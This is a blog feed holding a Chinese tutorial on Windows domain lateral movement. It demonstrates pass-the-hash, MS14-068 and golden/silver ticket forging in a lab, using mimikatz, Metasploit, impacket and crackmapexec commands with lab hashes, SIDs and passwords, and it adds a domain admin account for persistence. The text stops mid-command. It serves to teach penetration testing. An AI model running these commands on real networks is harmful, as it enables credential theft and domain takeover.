<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Linus1124</title>
  
  <subtitle>Every little helps</subtitle>
  <link href="https://linus1124-root.github.io/atom.xml" rel="self"/>
  
  <link href="https://linus1124-root.github.io/"/>
  <updated>2022-03-08T11:39:42.087Z</updated>
  <id>https://linus1124-root.github.io/</id>
  
  <author>
    <name>chen</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>浅析域渗透的pth&amp;ptt&amp;ptk</title>
    <link href="https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/"/>
    <id>https://linus1124-root.github.io/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/</id>
    <published>2022-03-06T12:09:16.000Z</published>
    <updated>2022-03-08T11:39:42.087Z</updated>
    
    <content type="html"><![CDATA[<p>一直对这一块知识有点知其然不知其所以然的感觉，所以这里总结一下关于这三种手法的原理及其利用。文章是以红日7的靶机作为域环境来进行的实验，域成员为192.168.93.20，域控为192.168.93.30，纯粹为了方便。。。</p><h1 id="PTH：Pass-The-Hash（Hash传递攻击）"><a href="#PTH：Pass-The-Hash（Hash传递攻击）" class="headerlink" title="PTH：Pass The Hash（Hash传递攻击）"></a>PTH：Pass The Hash（Hash传递攻击）</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>什么是LM Hash？什么是NTLM Hash？和pth有什么关系？</p><p>LM Hash(LAN Manager Hash)：当windows用户设置密码后，会生成一个Hash值，windows会把这个Hash值保存到c:\windows\system32\config\sam，文件中，Lm Hash也就是生成这个Hash值的一种单向散列函数，所以我们登录计算机输入密码的时候，计算机不会把我们的明文密码拿去和保存的密码比对，而是将我们输入的密码的Hash值拿去比对，如果Hash值相同，才能登陆成功。</p><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220307143037621.png" class title="image-20220307143037621"><p>LM Hash 的脆弱性：</p><p>1、密码长度限制为从95个ASCII可打印字符中最多选择14个，也就是密码的最长长度为14位</p><p>2、密码不区分大小写。在生成哈希值之前，所有密码都被转换为大写。因此 LM 哈希将 PassWord、password、PaSsWoRd、PASSword 和其他类似的组合视为 PASSWORD。这样的设计无疑极大的降低了爆破的难度，更容易进行Hash碰撞。</p><p>3、 14 个字符的密码被分成 7+7 个字符，并分别计算每一半的哈希值。也就是可以把一个密码分成两次爆破，又降低了爆破难度。</p><p>4、如果密码长度小于等于7，则哈希的后半部分将始终产生相同的常量值 (0xAAD3B435B51404EE)。这就让攻击者很容易识别密码的大概长度。</p><p>5、Hash值在不加盐的情况下发送到网络服务器，易受到中间人攻击，例如Hash重放。（加盐就是在你生成密码后，随机生成一个字符串加到你密码后面进行Hash，这样就算是相同的密码，Hash也是不同的，至于中间人攻击属于密码学范畴，这里不再赘述了）</p><p>这么多缺点为啥还要使用LM Hash这种加密算法？</p><p>许多传统的第三方SMB花费了相当长的时间来添加对 Microsoft 创建的用于替换 LM 哈希的更强大协议的支持，因为支持这些库的社区首先必须对较新的协议进行SAMBA花了 5 年时间来添加NTLMv2支持，而JCIFS花了 10 年。也就是LM Hash使用范围太广了，本着向后兼容的原因，还在使用LM Hash进行存储</p><p>NTML(NT Lan Manager)：网上有博主说NTML就是NT hash，其实这样说是不严谨的，在我查阅microsoft的官方文档后发现其实NTLM、NTLMv2 和 Kerberos 都使用 NT hash，也称为 Unicode 哈希。所以，应该叫使用NT hash这种方法，而NTML是一种安全协议。注意NTML和Kerberos（以后会发文详解Kerberos）是两种协议，NTML的认证过程更简单，自然也比Kerberos更易受到攻击。但也是plus版本的LM Hash。</p><p>简单说一下NTML的认证过程：</p><p>1、用户输入username、password、domainname（交互式才需要这个步骤），客户端会计算hash值保存在本地</p><p>2、客户端将username明文发给DC</p><p>3、DC生成一个16Byte的随机数（challenge）发送给客户端</p><p>4、户端通过运算生成一个响应值response&#x3D;f(hashes,challenge,other)&#x3D;&gt;other根据版本变化，例如时间戳来防止回访等</p><p>5、客户端将响应值发送给DC</p><p>6、DC经过同样的运算result &#x3D; f(hashes,challenge,other)，然后比较result和response，一直就验证通过，不一致则验证不通过</p><p>7、备注：目标不一定是DC，hash对应的账号所登录的（有缓存的）工作站也可以。</p><p>NTLM 协议使用两个散列密码值中的一个或两个，这两个值也都存储在服务器（或域控制器）上，并且由于没有加盐它们是密码等效的，这意味着如果你从服务器获取散列值，您可以在不知道实际密码的情况下进行身份验证。（这就是为什么dumphash后可以不用进行hash碰撞就能就行身份验证）</p><p>NTML就很安全吗？</p><p>自 2010 年起，微软就不再推荐在应用程序中使用 NTLM，因为NTML不支持最新的加密方式比如（AES 或 SHA-256），它使用的是MD4加密。</p><p>NTML的脆弱性：</p><p>1、易受hash传递攻击，在许多情况下， msf可用于从一台机器获取凭据，该凭据可用于控制另一台机器。 Squirtle 工具包可用于利用网站跨站点脚本xss攻击通过 NTLM 对附近资产进行攻击。</p><p>2、每一个可能的 8 字符 NTLM 密码哈希排列都可以在 3 小时内被破解。也就是密码短的NTML加密密码很容易被暴力破解。</p><h2 id="PTH攻击的原理及条件"><a href="#PTH攻击的原理及条件" class="headerlink" title="PTH攻击的原理及条件"></a>PTH攻击的原理及条件</h2><p>原理：本机 Windows 应用程序要求用户提供明文密码，然后调用LsaLogonUser之类的API，将密码转换为一个或两个哈希值（LM 或 NT 哈希），然后在 NTLM 身份验证期间将其发送到远程服务器。对该机制的分析表明，成功完成网络身份认证不需要明文密码，只需要哈希。<strong>在域环境中，用户登录计算机时使用的大都是域账号，大量计算机在安装时会使用相同的本地管理员账号和密码，因此，如果计算机的本地管理员账号和密码也是相同的，攻击者就能使用哈希传递攻击的方法登陆内网中的其他计算机。因此，攻击者如果使用工具将散列值传递到其他计算机中，进行权限验证，就能够在身份验证的时候模拟该用户(即跳过调用API生成hash的过程)，实现对计算机的控制。</strong></p><p>利用条件：</p><ul><li>域&#x2F;工作组环境</li><li>可以获得hash，但是条件不允许对hash爆破</li><li>网中存在和当前机器相同的密码</li></ul><h2 id="PTH的各种攻击手法"><a href="#PTH的各种攻击手法" class="headerlink" title="PTH的各种攻击手法"></a>PTH的各种攻击手法</h2><h3 id="一、mimikatz"><a href="#一、mimikatz" class="headerlink" title="一、mimikatz"></a>一、mimikatz</h3><p>mimikatz的pth功能需要本地管理员权限。</p><p>privilege::debug</p><p>sekurlsa::logonpasswords</p><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220307174851960.png" class title="image-20220307174851960"><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220307175035435.png" class title="image-20220307175035435"><p>可以看到这里LM 和 NTML都使用了，这里只研究NTML，复制NTML Hash的值</p><p>sekurlsa::pth &#x2F;user:administrator &#x2F;domain:WHOAMIANONY &#x2F;ntlm:ab89b1295e69d353dd7614c7a3a80cec</p><p>sekurlsa::pth &#x2F;user:administrator &#x2F;domain:WHOAMIANONY &#x2F;ntlm:ab89b1295e69d353dd7614c7a3a80cec “&#x2F;run:mstsc.exe &#x2F;restrictedadmin”也可以使用此命令顺便打开对方的3389，这里只使用第一种</p><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220307175628272.png" class title="image-20220307175628272"><p>看域成员机已经自动打开了一个administrator权限的cmd，这时连接域控192.168.93.30就不需要密码了</p><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220307181533555.png" class title="image-20220307181533555"><p>mimikatz的pass the hash成功</p><h3 id="二、msf的pth"><a href="#二、msf的pth" class="headerlink" title="二、msf的pth"></a>二、msf的pth</h3><p>msf内置有dumphash的模块</p><p>run post&#x2F;windows&#x2F;gather&#x2F;hashdump</p><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220307201432638.png" class title="image-20220307201432638"><p>使用抓到的Hash登陆</p><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220307201809777.png" class title="image-20220307201809777"><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308171935823.png" class title="image-20220308171935823"><p>这里有坑，一定要把LM Hash的值全部替换成0，试了非常久，虽然抓到了LM Hash但是直接用LM Hash:NTML Hash或者只用NTML Hash都会提示身份认证有误，要把LM Hash的值改为0就没问题，我看网上博主有直接用NTML Hash的也可以成功，这里具体的原因我也不太懂。</p><h3 id="三、impacket工具包"><a href="#三、impacket工具包" class="headerlink" title="三、impacket工具包"></a>三、impacket工具包</h3><p>smbclient.py插件，这里的32个0是LM Hash的值，随便写什么都可以，因为windows 2012过后默认关闭LM Hash</p><p>python3 smbclient.py -hashes 00000000000000000000000000000000:ab89b1295e69d353dd7614c7a3a80cec WHOAMIANONY&#x2F;<a href="mailto:&#x41;&#x64;&#x6d;&#x69;&#x6e;&#105;&#x73;&#116;&#x72;&#x61;&#x74;&#x6f;&#114;&#x40;&#x31;&#57;&#x32;&#46;&#49;&#54;&#56;&#46;&#57;&#51;&#x2e;&#51;&#x30;">&#x41;&#x64;&#x6d;&#x69;&#x6e;&#105;&#x73;&#116;&#x72;&#x61;&#x74;&#x6f;&#114;&#x40;&#x31;&#57;&#x32;&#46;&#49;&#54;&#56;&#46;&#57;&#51;&#x2e;&#51;&#x30;</a></p><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308091716872.png" class title="image-20220308091716872"><p>smbexec.py插件使用</p><p>python3 smbexec.py -hashes 00000000000000000000000000000000:ab89b1295e69d353dd7614c7a3a80cec <a href="mailto:&#65;&#x64;&#109;&#x69;&#110;&#x69;&#115;&#x74;&#x72;&#97;&#116;&#x6f;&#114;&#x40;&#49;&#x39;&#50;&#x2e;&#49;&#54;&#x38;&#x2e;&#57;&#x33;&#46;&#x33;&#x30;">&#65;&#x64;&#109;&#x69;&#110;&#x69;&#115;&#x74;&#x72;&#97;&#116;&#x6f;&#114;&#x40;&#49;&#x39;&#50;&#x2e;&#49;&#54;&#x38;&#x2e;&#57;&#x33;&#46;&#x33;&#x30;</a></p><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308092612807.png" class title="image-20220308092612807"><p>psexec.py插件使用</p><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308093101883.png" class title="image-20220308093101883"><p>wmiexec.py使用</p><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308093949487.png" class title="image-20220308093949487"><p>impacket包中还有其他脚本（eg：<em>rpcdump.py</em>）也可以用来对smb进行攻击，使用方法大同小异，这里就不演示了</p><h3 id="四、PTH工具包"><a href="#四、PTH工具包" class="headerlink" title="四、PTH工具包"></a>四、PTH工具包</h3><p>pth-smbclient -U WHOAMIANONY&#x2F;administrator%00000000000000000000000000000000:ab89b1295e69d353dd7614c7a3a80cec &#x2F;&#x2F;192.168.93.30&#x2F;c$，针对smb服务</p><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308094634025.png" class title="image-20220308094634025"><p>pth-rpcclient -U WHOAMIANONY&#x2F;administrator%00000000000000000000000000000000:ab89b1295e69d353dd7614c7a3a80cec &#x2F;&#x2F;192.168.93.30，针对rpc服务执行rpc命令</p><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308095055606.png" class title="image-20220308095055606"><p>pth-winexe -U WHOAMIANONY&#x2F;administrator%00000000000000000000000000000000:ab89b1295e69d353dd7614c7a3a80cec &#x2F;&#x2F;192.168.93.30 cmd.exe</p><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308095431637.png" class title="image-20220308095431637"><p>与impacket工具包差不多，这里也有其他模块可以利用抓到的hash进行攻击，这里就不再演示了。</p><h3 id="五、Crackmapexec"><a href="#五、Crackmapexec" class="headerlink" title="五、Crackmapexec"></a>五、Crackmapexec</h3><p>crackmapexec smb 192.168.93.30 -u administrator -H ab89b1295e69d353dd7614c7a3a80cec -x whoami</p><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308095928239.png" class title="image-20220308095928239"><h1 id="PTT：Pass-The-Ticket（Hash票据传递）"><a href="#PTT：Pass-The-Ticket（Hash票据传递）" class="headerlink" title="PTT：Pass The Ticket（Hash票据传递）"></a>PTT：Pass The Ticket（Hash票据传递）</h1><h2 id="前置知识-1"><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h2><p>经典三连</p><p>什么是黄金票据白银票据？他们有什么用？kerberos又是什么？</p><p>首先先了解一下kerberos协议的认证过程（网上关于kerberos的详细解析非常多，这里就简单理一下）：客户端向**认证服务器 (AS)<strong>认证自己，认证服务器将用户名转发到</strong>密钥分发中心 **(KDC)<strong>。KDC 发出一个</strong>票据授予票据 (TGT)<strong>，该票据带有时间戳，并使用</strong>票据授予服务 (TGS)**的密钥对其进行加密，并将加密的结果返回给用户的工作站。这很少发生，通常是在用户登录时；TGT 会在某个时候过期，尽管它可能会在用户登录时由用户的会话管理器透明地更新。</p><p><a href="https://www.cnblogs.com/artech/archive/2007/07/05/807492.html">https://www.cnblogs.com/artech/archive/2007/07/05/807492.html</a></p><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308112450743.png" class title="image-20220308112450743"><p>什么是黄金票据？</p><p>Golden Tickets 是伪造的 Ticket-Granting Tickets (TGT)，也称为身份验证票。可以访问域控，需要有域控的权限，拿到金票后域控更改密码也可以进行登陆。</p><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308112603791.png" class title="image-20220308112603791"><p>什么是白银票据？</p><p>银票是伪造的 Ticket Granting Service 票，也称为服务票。不可以访问域控，只能针对特定的服务进行访问，但是获取更容易，不需要任何特权账户，更隐秘。</p><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308112720029.png" class title="image-20220308112720029"><h2 id="PTT攻击的原理及条件"><a href="#PTT攻击的原理及条件" class="headerlink" title="PTT攻击的原理及条件"></a>PTT攻击的原理及条件</h2><p>黄金票据：主要用于做拿到域控后的权限维持，因为拿下了域控，所以能够抓到域内所有用户的Hash，因此利用krbtgt的Hash值可以伪造TGT，让某一普通用户成为域管理员</p><p>条件：</p><ul><li>krbtgt用户的hash</li><li>域名称</li><li>域的SID值</li><li>要伪造的用户名</li></ul><p>白银票据：白银票据是有效的TGS票据因为它是由为运行 Kerberos 身份验证服务的每个服务器配置的服务主体名称的服务帐户加密&#x2F;签名的。也就是说白银票据是由服务帐户（从计算机的本地 SAM 或服务帐户凭证提取的计算机帐户凭证）加密&#x2F;签名的。而且TGS没有与之关联的TGT也就是不会与域控直接联系，因此可以冒充域控对服务进行访问。</p><p>条件：</p><ul><li>域名，域sid</li><li>目标服务器名，目标服务器的服务</li><li>服务账号的NTML HASH </li><li>需要伪造的用户名</li></ul><p>两者最大的不同就是，黄金票据由krbtgt 的NTML Hash加密，白银票据由服务账号的NTML Hash加密</p><h2 id="PTT的各种攻击手法"><a href="#PTT的各种攻击手法" class="headerlink" title="PTT的各种攻击手法"></a>PTT的各种攻击手法</h2><h3 id="一、MS14-068"><a href="#一、MS14-068" class="headerlink" title="一、MS14-068"></a>一、MS14-068</h3><p>现在是普通的域成员的管理员权限，这里要注意执行域命令的话要使用在域中存在的账户，而system权限的账户whoami可以发现不在域中，所以这里一定要使用administrator权限的账户</p><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308143024538.png" class title="image-20220308143024538"><p>查看当前计算机名和域</p><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308143635556.png" class title="image-20220308143635556"><p>msf的自带模块可以定位域控及域主机名</p><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308145841037.png" class title="image-20220308145841037"><p>执行mimikatz.exe “privilege::debug” “sekurlsa::logonpasswords” “exit”&gt;log.txt，抓取Hash</p><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308150050482.png" class title="image-20220308150050482"><p>发现有个域用户的账号密码用户名为administrator</p><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308150718073.png" class title="image-20220308150718073"><p>现在是无法访问域控的c盘的（正确命令应该是dir \\DC.WHOAMIANONY.ORG\c$或者dir \\DC\c$，这里故意做没有凭据时的错误回显，演示用）</p><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308151507846.png" class title="image-20220308151507846"><p>查看已控制的域用户的SID</p><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308151818577.png" class title="image-20220308151818577"><p>使用ms14-068，ms14-068.exe -u 域成员名@域名 -p 域成员密码 -s 域成员sid -d 域控制器地址  （域控地址可以是ip）</p><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308152102520.png" class title="image-20220308152102520"><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308152322309.png" class title="image-20220308152322309"><p>mimikatz清空之前缓存的凭证，导入伪造的凭证</p><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308152451407.png" class title="image-20220308152451407"><p>已经有域管的权限</p><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308153659219.png" class title="image-20220308153659219"><h3 id="二、kekeo"><a href="#二、kekeo" class="headerlink" title="二、kekeo"></a>二、kekeo</h3><p><a href="https://github.com/gentilkiwi/kekeo/releases/tag/2.2.0-20200718">https://github.com/gentilkiwi/kekeo/releases/tag/2.2.0-20200718</a></p><p>exploit::ms14068 &#x2F;domain:whoamianony.org &#x2F;user:administrator &#x2F;password:Whoami2021 &#x2F;ptt</p><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308155430200.png" class title="image-20220308155430200"><p>这里我不知道为什么kali执行 dir \\DC\c$会报错，但是在win7本机确实可以访问，具体原因我不太明白</p><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308155551146.png" class title="image-20220308155551146"><h3 id="三、goldenpac"><a href="#三、goldenpac" class="headerlink" title="三、goldenpac"></a>三、goldenpac</h3><p>可以使用impacket包中的goldenpac脚本，直接获得一个system的cmd</p><p>需要在kali安装kerberos认证功能</p><p>apt-get install krb5-user</p><p>但是我使用此模块并没有成功弹回system的cmd。。。。。。</p><p>python3 goldenPac.py -dc-ip 192.168.93.30 -target-ip 192.168.93.20 whoamianony.org&#x2F;administrator:<a href="mailto:&#x57;&#104;&#x6f;&#97;&#109;&#x69;&#50;&#x30;&#50;&#x31;&#64;&#x44;&#67;&#46;&#119;&#104;&#x6f;&#97;&#109;&#x69;&#97;&#110;&#111;&#x6e;&#x79;&#x2e;&#x6f;&#114;&#x67;">&#x57;&#104;&#x6f;&#97;&#109;&#x69;&#50;&#x30;&#50;&#x31;&#64;&#x44;&#67;&#46;&#119;&#104;&#x6f;&#97;&#109;&#x69;&#97;&#110;&#111;&#x6e;&#x79;&#x2e;&#x6f;&#114;&#x67;</a></p><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308162840622.png" class title="image-20220308162840622"><h3 id="四、使用msf的模块"><a href="#四、使用msf的模块" class="headerlink" title="四、使用msf的模块"></a>四、使用msf的模块</h3><p>use auxiliary&#x2F;admin&#x2F;kerberos&#x2F;ms14_068_kerberos_checksum</p><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308163401831.png" class title="image-20220308163401831"><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308163727221.png" class title="image-20220308163727221"><p>在&#x2F;root&#x2F;.msf4&#x2F;loot文件夹下会生成一个文件，需要用mimikatz进行格式转换（生成的文件与mimikatz在同一目录下）</p><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308165539270.png" class title="image-20220308165539270"><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308165504698.png" class title="image-20220308165504698"><p>将生成的<a href="mailto:&#x30;&#x2d;&#x30;&#48;&#48;&#x30;&#48;&#x30;&#x30;&#48;&#x2d;&#x61;&#100;&#x6d;&#x69;&#110;&#105;&#115;&#116;&#114;&#97;&#x74;&#111;&#114;&#x40;&#107;&#x72;&#98;&#x74;&#103;&#116;&#45;&#87;&#x48;&#x4f;&#x41;&#x4d;&#73;&#65;&#78;&#x4f;&#x4e;&#89;&#46;&#x4f;&#x52;&#71;&#x2e;&#x6b;&#105;&#x72;&#x62;&#x69;">&#x30;&#x2d;&#x30;&#48;&#48;&#x30;&#48;&#x30;&#x30;&#48;&#x2d;&#x61;&#100;&#x6d;&#x69;&#110;&#105;&#115;&#116;&#114;&#97;&#x74;&#111;&#114;&#x40;&#107;&#x72;&#98;&#x74;&#103;&#116;&#45;&#87;&#x48;&#x4f;&#x41;&#x4d;&#73;&#65;&#78;&#x4f;&#x4e;&#89;&#46;&#x4f;&#x52;&#71;&#x2e;&#x6b;&#105;&#x72;&#x62;&#x69;</a>拷贝回kali，通过kiwi模块导入</p><p>这个地方导入的时候又出现了错误。。我查阅很多资料发现其他博主也会导入不成功，目前我还是没弄懂原因</p><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308170058648.png" class title="image-20220308170058648"><p>如果导入成功可以使用  exploit&#x2F;windows&#x2F;local&#x2F;current_user_psexecset模块进行攻击</p><h3 id="五、制作黄金票据"><a href="#五、制作黄金票据" class="headerlink" title="五、制作黄金票据"></a>五、制作黄金票据</h3><p><strong>mimikatz制作</strong></p><p>使用mimikatz来抓取DC的Krbtgt用户的密码Hash，已经拿下域控的条件下，做权限维持用</p><p>在DC下使用mimikatz抓到了Krbtgt用户的密码Hash，此时DC被修改密码，我们控制的还有一台普通域用户的shell</p><p>在域控下抓到的Hash</p><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308172118232.png" class title="image-20220308172118232"><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308172141266.png" class title="image-20220308172141266"><p>满足前三点制作黄金票据的条件：1、域的SID S-1-5-21-1315137663-3706837544-1429009142 </p><p>2、域的名称 WHOAMIANONY</p><p>3、krbtgt的hash 6be58bfcc0a164af2408d1d3bd313c2a</p><p>4、伪造任意用户名</p><p>制作黄金票据</p><p>kerberos::golden &#x2F;user:administrator &#x2F;domain:whoamianony.org &#x2F;sid:S-1-5-21-1315137663-3706837544-1429009142 &#x2F;krbtgt:6be58bfcc0a164af2408d1d3bd313c2a &#x2F;ticket:hack.kirbi</p><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308173957253.png" class title="image-20220308173957253"><p>清除之前的票据</p><p>kerberos::purge</p><p>kerberos::tgt</p><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308174152540.png" class title="image-20220308174152540"><p>导入生成的黄金票据</p><p>kerberos::ptt hack.kirbi</p><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308174406051.png" class title="image-20220308174406051"><p>可以正常访问域控，添加域管理员也可以</p><p>net user hack hack111!@ &#x2F;add &#x2F;domain</p><p>net group “domain admins” hack &#x2F;add &#x2F;domain</p><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308174434161.png" class title="image-20220308174434161"><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308174617592.png" class title="image-20220308174617592"><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308174630585.png" class title="image-20220308174630585"><p><strong>impacket工具包制作</strong></p><p>先删除之前的票据</p><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308180406045.png" class title="image-20220308180406045"><p>制作黄金票据，票据可以在本机做好传给普通域成员机</p><p>python3 ticketer.py -nthash 6be58bfcc0a164af2408d1d3bd313c2a -domain-sid S-1-5-21-1315137663-3706837544-1429009142 -domain whoamianony.org administrator</p><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308181640529.png" class title="image-20220308181640529"><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308181726991.png" class title="image-20220308181726991"><p>更改域成员机环境配置</p><p>set KRB5CCNAME&#x3D;C:\administrator.ccache</p><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308181807973.png" class title="image-20220308181807973"><p>使用wmiexec来运行</p><p>wmiexec.exe whoamianony.org&#x2F;administrator@DC -k -no-pass，也可以直接访问域控</p><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308184724417.png" class title="image-20220308184724417"><h3 id="六、制作白银票据伪造CIFS服务权限"><a href="#六、制作白银票据伪造CIFS服务权限" class="headerlink" title="六、制作白银票据伪造CIFS服务权限"></a>六、制作白银票据伪造CIFS服务权限</h3><p>CIFS：用于windows主机之间进行网络文件共享</p><p>同样需要域控的mimikatz获取一些信息</p><img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308185345321.png" class title="image-20220308185345321"><p>1、域名 WHOAMIANONY</p><p>2、域sid S-1-5-21-1315137663-3706837544-1429009142</p><p>3、服务账号的NTLM Hash ab89b1295e69d353dd7614c7a3a80cec</p><p>4、要伪造的用户名，随便填，常用administrator</p><p>5、域控ip 192.168.93.30</p><p>6、可利用的服务</p><p>制作银票再导入票据</p><p>kerberos::golden &#x2F;domain:whoamianony.org &#x2F;sid:S-1-5-21-1315137663-3706837544-1429009142 &#x2F;target:DC.whoamianony.org &#x2F;service:cifs &#x2F;rc4:ab89b1295e69d353dd7614c7a3a80cec 